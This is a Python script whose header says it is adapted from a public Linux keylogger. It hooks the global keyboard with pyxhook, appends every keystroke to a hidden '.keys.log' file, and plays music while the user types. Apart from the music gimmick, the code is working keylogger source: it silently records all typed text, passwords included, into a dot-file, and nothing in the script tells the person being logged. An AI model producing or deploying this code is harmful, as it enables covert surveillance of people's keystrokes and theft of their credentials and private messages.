# ADAPTED FROM: https://raw.githubusercontent.com/GiacomoLaw/Keylogger/master/linux/keylogger.py

# import needed modules
import os
import pyxhook
import pygame
import threading

def main():
    global running
    global timeout
    timeout = 10
    running = True

    # Specify the name of the file (can be changed )
    log_file = f'{os.getcwd()}/.keys.log'
    chars = "    "
    
    # initialize the pygame mixer
    pygame.mixer.init()
    pygame.mixer.music.load(".music.mp3")
    pygame.mixer.music.set_volume(0.8)
    pygame.mixer.music.play(-1)
    
    # immediately pause
    pygame.mixer.music.pause() 
    
    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    chars = ["", "", "", ""]


    def dec_timeout():
        global timeout
        timeout = max(timeout - 1, 0)
        return timeout

    def set_timeout(time):
        global timeout
        timeout = time

    def pause_callback(mixer, time):
        global timeout
        global running

        while running:
            while dec_timeout():
                time.Clock().tick(10)

            set_timeout(5)

            if mixer.music.get_busy():
                mixer.music.pause()
        
        return
            
    # start a new thread to pause the music after 500ms of no typing
    threading.Thread(target=pause_callback, args=(pygame.mixer, pygame.time), ).start()

    # The logging function with {event parm}
    def OnKeyPress(event, chars):
        global running

        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                char = chr(event.Ascii)
                f.write(f"{char}")

                # unpause the music, reset a timeout for pausing it
                pygame.mixer.music.unpause()
                set_timeout(5)

                # using a list because of mutability
                chars.pop(0)
                chars.append(char)
                last_four_chars = "".join(c for c in chars)

                if last_four_chars == "quit" or last_four_chars == "exit":
                    running = False
                    new_hook.cancel()

    new_hook.KeyDown = lambda e: OnKeyPress(e, chars)
    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line so close the listener
        running = False
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")


if __name__ == "__main__":
    main()


